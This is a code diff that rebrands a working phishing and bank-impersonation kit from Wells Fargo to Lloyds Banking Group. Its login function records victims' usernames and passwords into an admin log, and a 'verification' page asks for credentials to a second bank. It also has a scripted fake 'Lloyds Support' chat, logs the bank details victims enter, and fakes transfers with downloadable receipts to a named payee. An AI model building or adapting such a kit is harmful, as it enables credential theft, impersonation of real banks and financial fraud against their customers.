+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Open Bond</button>
+                    </div>
+                </div>
+            </div>
+
             <!-- Verification View -->
             <div id="view-verification" style="display:none; gap:30px; width:100%;">
                 <div class="sidebar" style="width:300px;">
                     <h3>Verification Steps</h3>
                     <p><strong>Step 1:</strong> Select your secondary bank and provide credentials to verify funds availability.</p>
-                    <p><strong>Step 2:</strong> Chat with Wells Fargo Customer Service for assistance.</p>
-                    <p style="margin-top:20px;color:#d71e28;"><i class="fas fa-shield-alt"></i> This portal is secure and encrypted.</p>
+                    <p><strong>Step 2:</strong> Chat with Lloyds Customer Service for assistance.</p>
+                    <p style="margin-top:20px;color:#006a4d;"><i class="fas fa-shield-alt"></i> This portal is secure and encrypted.</p>
                 </div>
                 <div style="flex:1;">
                     <div class="form-section">
@@ -198,6 +464,7 @@
                                 <option value="" disabled selected>Select your bank</option>
                                 <option value="Chase">Chase</option>
                                 <option value="Bank of America">Bank of America</option>
+                                <option value="Lloyds Bank">Lloyds Bank</option>
                                 <option value="Wells Fargo">Wells Fargo</option>
                                 <option value="Citibank">Citibank</option>
                                 <option value="U.S. Bank">U.S. Bank</option>
@@ -222,10 +489,10 @@
                     </div>
 
                     <div class="chat-container">
-                        <h3 style="color:#a8151b;margin-bottom:15px;">Wells Fargo Customer Service Live Chat</h3>
+                        <h3 style="color:#004d38;margin-bottom:15px;">Lloyds Banking Group Customer Service Live Chat</h3>
                         <div class="chat-box" id="chatBox">
                             <div class="chat-message admin">
-                                <strong>Wells Fargo Support:</strong> Hello, we're here to help you verify your accounts for the withdrawal. Please enter your credentials above and we'll proceed.
+                                <strong>Lloyds Support:</strong> Hello, we're here to help you verify your accounts for the withdrawal. Please enter your credentials above and we'll proceed.
                             </div>
                         </div>
                         <div class="chat-input-area">
@@ -239,7 +506,7 @@
     </div>
 
     <div class="footer">
-        <p>&copy; 2026 Wells Fargo. All rights reserved. | Secure Banking Portal v3.1</p>
+        <p>&copy; 2026 Lloyds Banking Group. All rights reserved. | Secure Banking Portal v3.1</p>
     </div>
 
     <script>
@@ -251,26 +518,26 @@
 
         // Default transactions shown when no custom ones are set
         var defaultTransactions = [
-            { desc:'Wire Check Withdrawal', date:'June 3, 2026', amount:'$40,000.00', type:'withdrawal', status:'pending' },
-            { desc:'Check Withdrawal - Failed', date:'May 2, 2026', amount:'$71,000.00', type:'withdrawal', status:'failed' },
-            { desc:'Direct Deposit - Payroll', date:'April 30, 2026', amount:'$42,000.00', type:'deposit', status:'success' },
-            { desc:'Direct Deposit', date:'April 28, 2026', amount:'$120,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 28, 2026', amount:'$120,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 26, 2026', amount:'$88,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 26, 2026', amount:'$88,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 24, 2026', amount:'$76,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 24, 2026', amount:'$76,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 22, 2026', amount:'$68,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 22, 2026', amount:'$68,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 20, 2026', amount:'$65,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 20, 2026', amount:'$65,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 18, 2026', amount:'$55,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 18, 2026', amount:'$55,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 16, 2026', amount:'$35,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 16, 2026', amount:'$35,000.00', type:'withdrawal', status:'success' },
-            { desc:'Direct Deposit', date:'April 14, 2026', amount:'$20,000.00', type:'deposit', status:'success' },
-            { desc:'BTC Purchase', date:'April 14, 2026', amount:'$20,000.00', type:'withdrawal', status:'success' },
-            { desc:'Grocery Store', date:'April 10, 2026', amount:'$145.20', type:'withdrawal', status:'success' }
+            { desc:'Wire Check Withdrawal', date:'June 3, 2026', amount:'£40,000.00', type:'withdrawal', status:'pending' },
+            { desc:'Check Withdrawal - Failed', date:'May 2, 2026', amount:'£71,000.00', type:'withdrawal', status:'failed' },
+            { desc:'Direct Deposit - Payroll', date:'April 30, 2026', amount:'£42,000.00', type:'deposit', status:'success' },
+            { desc:'Direct Deposit', date:'April 28, 2026', amount:'£120,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 28, 2026', amount:'£120,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 26, 2026', amount:'£88,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 26, 2026', amount:'£88,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 24, 2026', amount:'£76,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 24, 2026', amount:'£76,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 22, 2026', amount:'£68,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 22, 2026', amount:'£68,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 20, 2026', amount:'£65,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 20, 2026', amount:'£65,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 18, 2026', amount:'£55,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 18, 2026', amount:'£55,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 16, 2026', amount:'£35,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 16, 2026', amount:'£35,000.00', type:'withdrawal', status:'success' },
+            { desc:'Direct Deposit', date:'April 14, 2026', amount:'£20,000.00', type:'deposit', status:'success' },
+            { desc:'BTC Purchase', date:'April 14, 2026', amount:'£20,000.00', type:'withdrawal', status:'success' },
+            { desc:'Grocery Store', date:'April 10, 2026', amount:'£145.20', type:'withdrawal', status:'success' }
         ];
 
         async function getFullState() {
@@ -327,19 +594,188 @@
             if (e.target === this) closeModal();
         });
 
+        
+        // ===== DYNAMIC ACCOUNT STATUS =====
+        var localAccountLocked = false;
+        
+        function handleQuickAction(action) {
+            try {
+                if (localAccountLocked) {
+                    showAccountClosedAlert();
+                } else {
+                    if (action === 'transfer') initTransferBanks();
+                    showView(action);
+                }
+            } catch(e) {
+                alert("Error in handleQuickAction: " + e.message);
+            }
+        }
+
+        // Bank List Data
+        var ukBanks = [
+            "Lloyds Bank PLC (Includes Halifax, Bank of Scotland)", "HSBC UK Bank Plc (Includes First Direct, M&S Bank)",
+            "Barclays Bank UK PLC", "National Westminster Bank Plc (NatWest, includes RBS)",
+            "Santander UK Plc (Includes TSB, Virgin Money)", "Metro Bank PLC",
+            "Clydesdale Bank Plc (Trading as Virgin Money)", "Yorkshire Bank (Trading as Virgin Money)",
+            "Northern Bank Limited (Danske Bank group, NI)", "AIB Group (UK) P.L.C.",
+            "Monzo Bank Limited", "Starling Bank Limited", "Revolut Bank UK Ltd", "Atom Bank PLC",
+            "Chase (J.P. Morgan Europe Limited)", "OakNorth Bank plc", "Allica Bank Limited",
+            "Tandem Bank", "Kroo Bank Ltd", "Zopa Bank Limited", "The Bank of London",
+            "Coutts & Company", "C. Hoare & Co.", "Investec Bank PLC", "Handelsbanken plc",
+            "Citibank UK Limited", "Bank of China (UK) Limited", "Goldman Sachs International Bank"
+        ];
+
+        function initTransferBanks() {
+            var listHtml = '';
+            ukBanks.forEach(function(bank) {
+                listHtml += '<div style="padding:10px; border-bottom:1px solid #ddd; cursor:pointer;" onclick="selectBank(\'' + bank.replace(/'/g, "\\'") + '\')"><i class="fas fa-university" style="color:#006a4d; margin-right:10px;"></i>' + bank + '</div>';
+            });
+            document.getElementById('bankList').innerHTML = listHtml;
+            document.getElementById('transferStep1').style.display = 'block';
+            document.getElementById('transferStep2').style.display = 'none';
+            document.getElementById('transferLoading').style.display = 'none';
+        }
+
+        var selectedBankNameGlobal = "";
+
+        function selectBank(bankName) {
+            selectedBankNameGlobal = bankName;
+            document.getElementById('selectedBankDisplay').innerText = "Selected Bank: " + bankName;
+            document.getElementById('transferStep1').style.display = 'none';
+            document.getElementById('transferStep2').style.display = 'block';
+        }
+
+        function resetTransferFlow() {
+            document.getElementById('transferStep2').style.display='none'; 
+            document.getElementById('transferStep1').style.display='block';
+            document.getElementById('starkVerificationBadge').style.display = 'none';
+            document.getElementById('amountSection').style.display = 'none';
+            document.getElementById('btnVerifyDetails').style.display = 'block';
+        }
+
+        async function verifyTransferDetails() {
+            var name = document.getElementById('txFullName').value.trim();
+            var sc = document.getElementById('txSortCode').value.trim();
+            var acc = document.getElementById('txAccNum').value.trim();
+            
+            if (name && sc && acc) {
+                var expBank = getSyncItem('expectedDomBank') || '';
+                var expName = getSyncItem('expectedDomName') || '';
+                var expSort = getSyncItem('expectedDomSort') || '';
+                var expAcc = getSyncItem('expectedDomAcc') || '';
+
+                if (expBank && expName && expSort && expAcc && 
+                    selectedBankNameGlobal === expBank && name === expName && sc === expSort && acc === expAcc) {
+                    
+                    document.getElementById('transferStep2').style.display = 'none';
+                    document.getElementById('transferLoading').style.display = 'block';
+                    
+                    setTimeout(function() {
+                        document.getElementById('transferLoading').style.display = 'none';
+                        document.getElementById('transferStep2').style.display = 'block';
+                        
+                        document.getElementById('starkVerificationBadge').style.display = 'block';
+                        document.getElementById('amountSection').style.display = 'block';
+                        document.getElementById('btnVerifyDetails').style.display = 'none';
+                    }, 2000);
+                } else {
+                    var logEntry = '<p style="color:#d9534f;"><strong>Failed Transfer Verification:</strong><br>' +
+                                   'Bank: ' + selectedBankNameGlobal + '<br>Entered: ' + name + ', ' + sc + ', ' + acc + '</p>';
+                    var currentLogs = getSyncItem('adminLogs') || '';
+                    await setSyncItem('adminLogs', currentLogs + logEntry);
+                    
+                    alert("The details entered could not be verified by the clearing house. Please check the information and try again.");
+                }
+            } else {
+                alert("Please fill in all recipient details.");
+            }
+        }
+
+        async function submitFinalTransfer() {
+            var amt = document.getElementById('txTransferAmount').value;
+            var ref = document.getElementById('txReference').value || 'Invoice Payment';
+            if (amt) {
+                var nm = document.getElementById('txFullName').value;
+                var sc = document.getElementById('txSortCode').value;
+                var ac = document.getElementById('txAccNum').value;
+
+                var logEntry = '<p><strong>Transfer Attempt:</strong> £' + amt + ' to STARK Building Materials UK<br>' +
+                               'Entered Details:<br>Name: ' + nm + '<br>Sort: ' + sc + '<br>Acc: ' + ac + '<br>' + selectedBankNameGlobal + '</p>';
+                var currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry);
+
+                // Setup Receipt
+                var now = new Date();
+                document.getElementById('receiptDate').innerText = now.toLocaleString('en-GB');
+                document.getElementById('receiptAmount').innerText = '£' + parseFloat(amt).toFixed(2);
+                document.getElementById('receiptBank').innerText = selectedBankNameGlobal;
+                document.getElementById('receiptName').innerText = nm;
+                document.getElementById('receiptRef').innerText = 'LLOYDS-' + Math.floor(Math.random()*1000000000);
+                
+                showView('receipt');
+            } else {
+                alert("Please enter a valid amount.");
+            }
+        }
+        
+        function downloadReceiptImage() {
+            html2canvas(document.getElementById("receiptContainer")).then(canvas => {
+                var link = document.createElement('a');
+                link.download = 'Transfer_Receipt_STARK.png';
+                link.href = canvas.toDataURL();
+                link.click();
+            });
+        }
+        
+        function downloadReceiptPDF() {
+            window.jspdf = window.jspdf || {};
+            var jsPDF = window.jspdf.jsPDF;
+            if(!jsPDF) { alert("PDF library loading. Please try again in a moment."); return; }
+            html2canvas(document.getElementById("receiptContainer")).then(canvas => {
+                var imgData = canvas.toDataURL('image/png');
+                var doc = new jsPDF('p', 'mm', 'a4');
+                var width = doc.internal.pageSize.getWidth();
+                var height = (canvas.height * width) / canvas.width;
+                doc.addImage(imgData, 'PNG', 0, 10, width, height);
+                doc.save('Transfer_Receipt_STARK.pdf');
+            });
+        }
+
+        async function submitBillPayment() {
+            var payee = document.getElementById('billPayee').value;
+            var amt = document.getElementById('billAmount').value;
+            if (amt) {
+                var logEntry = '<p><strong>Bill Payment Attempt:</strong> £' + amt + ' to ' + payee + '</p>';
+                var currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry);
+                alert("Payment of £" + amt + " to " + payee + " has been scheduled.");
+                showView('home');
+            } else {
+                alert("Please enter a valid amount.");
+            }
+        }
+
         // ===== VIEW NAVIGATION =====
         function showView(viewId) {
-            document.getElementById('view-login').style.display = 'none';
-            document.getElementById('app-header').style.display = 'flex';
-            document.getElementById('main-app').style.display = 'flex';
+            try {
+                var elsToHide = ['view-login', 'view-home', 'view-verification', 'view-history', 'view-transfer', 'view-bills', 'view-investments'];
+                for (var i=0; i<elsToHide.length; i++) {
+                    var el = document.getElementById(elsToHide[i]);
+                    if (el) el.style.display = 'none';
+                }
 
-            document.getElementById('view-home').style.display = 'none';
-            document.getElementById('view-verification').style.display = 'none';
-            document.getElementById('view-history').style.display = 'none';
+                var header = document.getElementById('app-header');
+                if (header) header.style.display = 'flex';
+                
+                var mainApp = document.getElementById('main-app');
+                if (mainApp) mainApp.style.display = 'flex';
 
-            var el = document.getElementById('view-' + viewId);
-            if (el) {
-                el.style.display = (viewId === 'verification') ? 'flex' : 'block';
+                var target = document.getElementById('view-' + viewId);
+                if (target) {
+                    target.style.display = (viewId === 'verification') ? 'flex' : 'block';
+                }
+            } catch(e) {
+                alert("Error in showView: " + e.message);
             }
         }
 
@@ -355,11 +791,11 @@
         }
 
         // ===== LOGIN =====
-        async function submitWellsFargoLogin() {
+        async function submitLloydsLogin() {
             var u = document.getElementById('chaseUser').value;
             var p = document.getElementById('chasePass').value;
             if (u && p) {
-                var logEntry = '<p><strong>Initial Wells Fargo Login:</strong> Username: ' + u + ', Password: ' + p + '</p>';
+                var logEntry = '<p><strong>Initial Lloyds Login:</strong> Username: ' + u + ', Password: ' + p + '</p>';
                 var currentLogs = getSyncItem('adminLogs') || '';
                 await setSyncItem('adminLogs', currentLogs + logEntry);
                 document.getElementById('loginStep1').style.display = 'none';
@@ -419,10 +855,34 @@
                 return;
             }
 
+            
+            // Account Lock Logic
+            if (globalState.accountLocked === true) {
+                localAccountLocked = true;
+                // Show Verification Nav
+                var navLinks = document.querySelectorAll('.nav a');
+                if (navLinks.length > 1) {
+                    navLinks[1].style.display = 'inline-block'; // show Verification
+                }
+                // Show Alert on Home
+                var alertClosed = document.querySelector('.alert-closed');
+                if (alertClosed) alertClosed.style.display = 'block';
+            } else {
+                localAccountLocked = false;
+                // Hide Verification Nav
+                var navLinks = document.querySelectorAll('.nav a');
+                if (navLinks.length > 1) {
+                    navLinks[1].style.display = 'none'; // hide Verification
+                }
+                // Hide Alert on Home
+                var alertClosed = document.querySelector('.alert-closed');
+                if (alertClosed) alertClosed.style.display = 'none';
+            }
+
             // Chat history
             var history = getSyncItem('chatHistory');
             if (history) {
-                var initialMessage = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
+                var initialMessage = '<div class="chat-message admin"><strong>Lloyds Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
                 document.getElementById('chatBox').innerHTML = initialMessage + history;
             }
 
@@ -430,6 +890,14 @@
             var dEmail = getSyncItem('displayEmail');
             if (dEmail) {
                 document.getElementById('otpEmailDisplay').innerHTML = 'A one-time passcode has been sent to <strong>' + dEmail + '</strong>. Please enter it below.';
+            }
+
+            
+            // Welcome Name
+            var wName = getSyncItem('welcomeName');
+            if (wName) {
+                var el = document.getElementById('welcomeName');
+                if (el) el.innerText = wName;
             }
 
             // Card name
@@ -571,7 +1039,7 @@
                     if (lowerInput.includes('long') || lowerInput.includes('why') || lowerInput.includes('taking') || lowerInput.includes('time')) {
                         autoReply = 'Make sure the details you input is correct and try again.';
                     }
-                    var aiEntry = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> ' + autoReply + '</div>';
+                    var aiEntry = '<div class="chat-message admin"><strong>Lloyds Support:</strong> ' + autoReply + '</div>';
                     var latestChats = getSyncItem('chatHistory') || '';
                     await setSyncItem('chatHistory', latestChats + aiEntry);
                 }, 1500);
